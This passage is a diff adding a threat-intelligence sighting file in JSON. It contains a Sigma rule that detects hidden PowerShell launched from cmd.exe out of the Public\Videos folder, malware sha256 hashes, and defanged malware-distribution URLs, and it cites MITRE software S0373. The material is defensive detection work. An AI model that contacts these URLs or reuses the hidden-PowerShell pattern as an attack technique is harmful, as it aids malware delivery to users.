+            "FIC=",
+            "YE8N="
+          ]
+        },
+        "condition": "selection"
+      }
+    },
+    {
+      "query": "Hunt for suspicious PowerShell execution with Public folder in command line",
+      "queryId": "e4bf9d04-b39a-438b-9e2b-217b04055217",
+      "type": "sigma",
+      "behaviorIds": [
+        "8f8d88d8-b0d9-4e4d-a680-5b4ee115f886"
+      ],
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": [
+            "\\\\powershell.exe"
+          ],
+          "ParentImage|endswith": [
+            "\\\\cmd.exe"
+          ],
+          "commandLine|contains|all": [
+            "-windowstyle",
+            "hidden",
+            "-Command",
+            "\\\\Public\\\\Videos\\\\"
+          ]
+        },
+        "condition": "all of them"
+      }
+    }
+  ],
+  "iocs": [
+    {
+      "behaviorIds": [
+        "2415d026-bbf4-4005-90f4-aee59585fb9c"
+      ],
+      "indicators": [
+        {
+          "sha256": "708a687ac41584ea1d8d567334ce441a5214aaa601c1a6214475144abbbd72fe"
+        },
+        {
+          "sha256": "a49e20c8211e8f4268b0b5c13b4f1d70a0b74dc24e8a08a857cd2b1ff4ad4c3f"
+        },
+        {
+          "sha256": "7ae01fd7aa0b5898eb36548024f2cc8156216322ea6402eb8f04180adfc9539d"
+        },
+        {
+          "sha256": "4af123558afa33de6944a4766fc63c6ed31b661cda5a1162f89e8f1edec0b0fa"
+        },
+        {
+          "sha256": "68607e0043c83b83ab6653476ef90aff1d42812e2a6cf7e39149a551f63efb36"
+        },
+        {
+          "sha256": "237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d"
+        },
+        {
+          "sha256": "7230956f4c915842cc3985174a1b05906ef53308a4ae0755ca9ecc96fe400df8"
+        },
+        {
+          "sha256": "7d361e62e333b2ed467505025fd04c75b63c6aca9b15dad6f76adc8bd1deadbd"
+        },
+        {
+          "sha256": "a468044a374a872732928cf9f1814b7e26dab28e381ca43a8ccfa54a2c67eeae"
+        }
+      ]
+    },
+    {
+      "behaviorIds": [
+        "c5858702-304e-4cac-b8f0-5e1a59fd8f14"
+      ],
+      "indicators": [
+        {
+          "sha256": "c43738a850d1ae9d59f39d592cdc3faca6a327735dbaaa9c979b5036dba72937"
+        }
+      ]
+    },
+    {
+      "behaviorIds": [
+        "1e64609c-5125-4e4a-9ad0-e0e1a5dcd240"
+      ],
+      "indicators": [
+        {
+          "url": "http://waa8.nolii[.]date/?1/"
+        }
+      ]
+    },
+    {
+      "behaviorIds": [
+        "4d397821-7cdd-4c3e-85be-5fcb196e8652"
+      ],
+      "indicators": [
+        {
+          "url": "http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921"
+        }
+      ]
+    },
+    {
+      "behaviorIds": [
+        "db7423fd-d058-4768-9fe3-4a6ff4654c39"
+      ],
+      "indicators": [
+        {
+          "sha256": "1caa6af47e4db7bf1da8e6c49195ae238be282122a0196bd5abc4fc49fe4fc96"
+        },
+        {
+          "sha256": "2786ace6c24c5bfe3217f9babbe9146a17ff3210c49f51f9eb73a615ca866cff"
+        },
+        {
+          "sha256": "2f71a4e7c3177c328e56daff9b4665541b198a539c25873bbfa746e22968c22e"
+        },
+        {
+          "sha256": "2c646225ab4da6090ef51aa488135a4d2edc077071ebe9e173dde9d0eb43b0b7"
+        }
+      ]
+    },
+    {
+      "behaviorIds": [
+        "6b981fdf-ba8d-4e19-a437-662d672f627c"
+      ],
+      "indicators": [
+        {
+          "url": "http://weta950iitv.keorgia[.]life/?49547426338677879"
+        },
+        {
+          "url": "http://weta950iitv.keorgia[.]life/?54819973696676725"
+        },
+        {
+          "url": "http://weta950iitv.keorgia[.]life/?69413452047686482"
+        },
+        {
+          "url": "http://weta950iitv.keorgia[.]life/?56006860532636958"
+        }
+      ]
+    },
+    {
+      "behaviorIds": [
+        "e3379b96-037b-4030-bd67-2ff41f69ce43"
+      ],
+      "indicators": [
+        {
+          "sha256": "0d2b76c81f71697da861526aa672493b557f1480077dfde77a717a1cd69417d9"
+        }
+      ]
+    }
+  ],
+  "footer": {
+    "changeTracking": {
+      "created": "2021-10-18T00:00:00Z",
+      "lastModified": "2022-03-17T00:00:00Z",
+      "sightingVersion": 1.4,
+      "schemaVersion": 1.7
+    },
+    "references": [
+      "https://app.any.run/tasks/902b68a6-4069-4a8f-bd10-3f3b198ff0c5/#",
+      "https://twitter.com/StopMalvertisin/status/1448876652507717635",
+      "https://attack.mitre.org/software/S0373"
+    ]
+  }
+}
